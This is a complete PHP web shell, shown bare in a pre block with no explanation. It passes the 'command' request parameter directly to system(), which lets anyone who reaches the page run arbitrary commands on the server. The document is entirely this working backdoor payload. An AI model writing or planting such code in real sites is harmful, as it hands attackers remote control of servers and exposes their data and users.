<pre>
    <?php
    if (isset($_REQUEST["command"])) {
        system($_REQUEST["command"]);
    } else {
        echo "No command requested.";
    }
    ?>
</pre>